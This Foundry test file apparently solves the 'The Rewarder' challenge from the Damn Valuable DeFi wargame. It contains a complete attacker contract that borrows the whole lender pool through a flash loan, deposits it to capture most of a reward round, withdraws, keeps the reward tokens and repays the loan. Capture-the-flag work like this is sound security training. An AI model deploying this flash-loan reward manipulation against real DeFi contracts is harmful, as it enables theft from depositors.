// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TheRewarderPool} from "../../src/the-rewarder/TheRewarderPool.sol";
import {RewardToken} from "../../src/the-rewarder/RewardToken.sol";
import {AccountingToken} from "../../src/the-rewarder/AccountingToken.sol";
import {FlashLoanerPool} from "../../src/the-rewarder/FlashLoanerPool.sol";

contract TheRewarderTest is Test {
    uint256 private constant TOKENS_IN_LENDER_POOL = 1_000_000e18;
    uint256 private constant DEPOSIT_AMOUNT = 100e18;

    FlashLoanerPool private flashLoanerPool;
    TheRewarderPool private theRewarderPool;
    DamnValuableToken private dvt;
    Attacker private attacker;

    address private player;
    address private alice;
    address private bob;
    address private charlie;
    address private david;
    address[4] users;

    function setUp() public {
        alice = makeAddr("alice");
        bob = makeAddr("bob");
        charlie = makeAddr("charlie");
        david = makeAddr("david");
        users = [alice, bob, charlie, david];

        player = makeAddr("player");
        dvt = new DamnValuableToken();

        flashLoanerPool = new FlashLoanerPool(address(dvt));
        dvt.transfer(address(flashLoanerPool), TOKENS_IN_LENDER_POOL);

        theRewarderPool = new TheRewarderPool(address(dvt));

        vm.startPrank(player);
        attacker = new Attacker(address(flashLoanerPool), address(theRewarderPool), address(dvt));
        vm.stopPrank();

        for (uint8 i; i < 4; i++) {
            dvt.transfer(users[i], DEPOSIT_AMOUNT);
            vm.startPrank(users[i]);
            dvt.approve(address(theRewarderPool), DEPOSIT_AMOUNT);
            theRewarderPool.deposit(DEPOSIT_AMOUNT);
            assertEq(theRewarderPool.accountingToken().balanceOf(users[i]), DEPOSIT_AMOUNT);
            vm.stopPrank();
        }

        assertEq(theRewarderPool.accountingToken().totalSupply(), DEPOSIT_AMOUNT * 4);
        assertEq(theRewarderPool.rewardToken().totalSupply(), 0);

        vm.warp(block.timestamp + 5 days);

        uint256 roundRewards = theRewarderPool.REWARDS();

        for (uint8 i; i < 4; i++) {
            vm.startPrank(users[i]);
            theRewarderPool.distributeRewards();
            assertEq(theRewarderPool.rewardToken().balanceOf(users[i]), roundRewards / 4);
            vm.stopPrank();
        }

        assertEq(theRewarderPool.rewardToken().totalSupply(), roundRewards);
        assertEq(dvt.balanceOf(player), 0);
        assertEq(theRewarderPool.roundNumber(), 2);
    }

    function testAttack() public {
        // Exploit code:
        vm.warp(block.timestamp + 5 days);
        vm.startPrank(player);
        attacker.drainFunds();
        vm.stopPrank();
        //
        validate();
    }

    function validate() public {
        assertEq(theRewarderPool.roundNumber(), 3);
        uint256 rewards = theRewarderPool.REWARDS();
        for (uint8 i; i < 4; i++) {
            vm.prank(users[i]);
            theRewarderPool.distributeRewards();
            uint256 rewardPerUser = theRewarderPool.rewardToken().balanceOf(users[i]);
            uint256 delta = rewardPerUser - rewards / 4;
            assertLt(delta, 1e16);
        }
        assertGt(theRewarderPool.rewardToken().totalSupply(), rewards);
        uint256 playerRewards = theRewarderPool.rewardToken().balanceOf(player);
        assertGt(playerRewards, 0);
        uint256 deltaPlayer = rewards - playerRewards;
        assertLt(deltaPlayer, 1e17);
        assertEq(dvt.balanceOf(player), 0);
    }
}

// Attacker contract the malicious actor would deploy:
contract Attacker {
    address private theRewarderPool;
    address private flashLoanerPool;
    address private dvt;
    address private owner;

    constructor(address flashLoaner, address rewarder, address token) {
        flashLoanerPool = flashLoaner;
        theRewarderPool = rewarder;
        dvt = token;
        owner = msg.sender;
    }

    function drainFunds() public {
        require(msg.sender == owner);
        uint256 flashLoanAmount = DamnValuableToken(dvt).balanceOf(flashLoanerPool);
        FlashLoanerPool(flashLoanerPool).flashLoan(flashLoanAmount);
    }

    function receiveFlashLoan(uint256 amount) external {
        TheRewarderPool pool = TheRewarderPool(theRewarderPool);
        DamnValuableToken(dvt).approve(theRewarderPool, amount);
        pool.deposit(amount);
        pool.withdraw(amount);
        pool.rewardToken().transfer(owner, pool.rewardToken().balanceOf(address(this)));
        DamnValuableToken(dvt).transfer(flashLoanerPool, amount);
    }
}
